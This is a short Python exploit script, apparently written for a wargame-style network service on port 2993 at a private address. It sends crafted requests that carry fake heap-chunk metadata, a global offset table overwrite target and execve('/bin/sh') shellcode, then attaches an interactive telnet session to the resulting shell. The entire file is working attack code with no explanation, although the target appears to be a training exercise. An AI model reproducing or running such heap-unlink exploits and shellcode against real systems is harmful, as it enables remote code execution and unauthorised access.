#!/usr/bin/python

import socket
import struct
import telnetlib

IP = "192.168.43.218"
PORT = 2993
REQSZ = 128


sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
sock.connect((IP , PORT))

def pad(m):
	padding = "\x00"*(REQSZ-len(m))
	_m = "FSRD" + m + padding
	return _m[:REQSZ]


METADATA = struct.pack("I", 0xfffffffc)
HEAP = struct.pack("I" , 0x804e020)
WRITE_GOT = struct.pack("I" , 0x804d41c - 0xc)

SHELL = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

JTS = "\xeb\x0e"

FH = (METADATA * 2) + WRITE_GOT + HEAP

sock.send(pad("/ROOT/" + "/" * 14 + JTS + "A" * 14 + SHELL + "/" * 128 ))
sock.send(pad("ROOT/" + FH))
sock.send("OK!")

tel = telnetlib.Telnet()
tel.sock = sock
tel.interact()
